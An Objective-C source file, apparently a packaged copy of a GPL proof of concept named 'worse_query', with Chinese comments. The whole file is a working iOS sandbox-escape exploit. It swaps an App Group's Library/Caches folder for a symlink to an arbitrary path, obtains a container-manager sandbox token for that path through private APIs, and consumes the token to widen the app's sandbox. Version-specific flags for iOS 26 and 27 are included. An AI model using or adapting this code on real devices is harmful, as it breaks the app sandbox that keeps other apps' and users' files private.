// worse_query.m — 上游 PoC 的实现（GPL-3.0-or-later）
// 来源：https://github.com/forcequitOS/worse_query ，作者 Taj C (forcequit)
// 本文件按上游逻辑整理，保留 GPL 声明；分发/集成需遵守 GPL-3.0-or-later。

#import <Foundation/Foundation.h>
#include <dlfcn.h>
#include <stdlib.h>
#include <xpc/xpc.h>
#include <sys/stat.h>
#import "worse_query.h"

typedef void *(*container_query_create_fn)(void);
typedef void (*container_query_set_class_fn)(void *, uint64_t);
typedef void (*container_query_set_identifiers_fn)(void *, xpc_object_t);
typedef void (*container_query_set_flags_fn)(void *, uint64_t);
typedef void (*container_query_set_part_fn)(void *, uint64_t);
typedef void *(*container_query_get_single_result_fn)(void *);
typedef void (*container_query_free_fn)(void *);
typedef char *(*container_copy_sandbox_token_fn)(void *);
typedef int64_t (*sandbox_extension_consume_fn)(const char *);
typedef int (*sandbox_extension_release_fn)(int64_t);

// 把 App Group 的 Library/Caches 恢复成普通目录（每次查询都会临时改成符号链接）
static void wq_clean_symlink(NSString *group) {
    if (!group) return;
    NSFileManager *fm = [NSFileManager defaultManager];
    NSURL *root = [fm containerURLForSecurityApplicationGroupIdentifier:group];
    if (!root) return;
    NSURL *caches = [root URLByAppendingPathComponent:@"Library/Caches"];
    [fm removeItemAtURL:caches error:nil];
    [fm createDirectoryAtURL:caches withIntermediateDirectories:false attributes:nil error:nil];
}

int64_t worse_query(NSString *target, NSString *group, bool alt_flags, bool create_dir) {
    if (!target.length || !group.length) return -1;
    if (!create_dir) {
        struct stat st;
        if (lstat(target.fileSystemRepresentation, &st) != 0) return -255;
    }

    NSFileManager *fm = [NSFileManager defaultManager];
    NSURL *root = [fm containerURLForSecurityApplicationGroupIdentifier:group];
    if (!root) return -1;                                  // 没有 App Group 容器
    NSString *caches = [[root URLByAppendingPathComponent:@"Library/Caches"] path];

    void *mgr = dlopen("/usr/lib/system/libsystem_containermanager.dylib", RTLD_NOW | RTLD_LOCAL);
    if (!mgr) return -2;

    container_query_create_fn q_create = (container_query_create_fn)dlsym(mgr, "container_query_create");
    container_query_set_class_fn q_class = (container_query_set_class_fn)dlsym(mgr, "container_query_set_class");
    container_query_set_identifiers_fn q_group = (container_query_set_identifiers_fn)dlsym(mgr, "container_query_set_group_identifiers");
    container_query_set_flags_fn q_flags = (container_query_set_flags_fn)dlsym(mgr, "container_query_operation_set_flags");
    container_query_set_part_fn q_part = (container_query_set_part_fn)dlsym(mgr, "container_query_operation_set_part");
    container_query_get_single_result_fn q_result = (container_query_get_single_result_fn)dlsym(mgr, "container_query_get_single_result");
    container_query_free_fn q_free = (container_query_free_fn)dlsym(mgr, "container_query_free");
    container_copy_sandbox_token_fn q_token = (container_copy_sandbox_token_fn)dlsym(mgr, "container_copy_sandbox_token");
    sandbox_extension_consume_fn consume = (sandbox_extension_consume_fn)dlsym(RTLD_DEFAULT, "sandbox_extension_consume");

    if (!q_create || !q_class || !q_group || !q_flags || !q_part || !q_result || !q_free || !q_token || !consume) {
        dlclose(mgr);
        return -2;
    }

    void *query = q_create();
    if (!query) { dlclose(mgr); return -3; }

    q_class(query, 7);                                     // class 7 = app group
    xpc_object_t ident = xpc_string_create(group.UTF8String);
    q_group(query, ident);
    q_part(query, 3);                                      // part 3 = Library/Caches
    q_flags(query, alt_flags ? 0x0000000800000000ULL       // iOS 26.x
                             : 0x0000008000000000ULL);     // iOS 27+

    [fm removeItemAtPath:caches error:nil];
    if (![fm createSymbolicLinkAtPath:caches withDestinationPath:target error:nil]) {
        dlclose(mgr);
        return -4;
    }

    void *result = q_result(query);
    if (!result) {
        q_free(query); dlclose(mgr); wq_clean_symlink(group);
        return -5;
    }
    char *token = q_token(result);
    if (!token) {
        q_free(query); dlclose(mgr); wq_clean_symlink(group);
        return -6;
    }

    int64_t handle = consume(token);
    q_free(query);
    free(token);
    dlclose(mgr);
    wq_clean_symlink(group);
    return handle;
}

void worse_query_release(int64_t handle) {
    if (handle < 0) return;
    sandbox_extension_release_fn release = (sandbox_extension_release_fn)dlsym(RTLD_DEFAULT, "sandbox_extension_release");
    if (release) release(handle);
}
